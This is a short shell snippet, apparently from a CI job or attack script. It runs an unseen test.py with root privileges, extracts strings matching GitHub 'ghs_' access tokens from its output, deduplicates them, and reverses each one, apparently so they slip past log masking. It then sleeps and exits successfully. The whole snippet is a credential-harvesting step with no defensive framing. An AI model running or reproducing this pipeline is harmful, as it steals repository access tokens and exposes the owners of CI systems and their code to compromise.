sudo python3 test.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
sleep 100
exit 0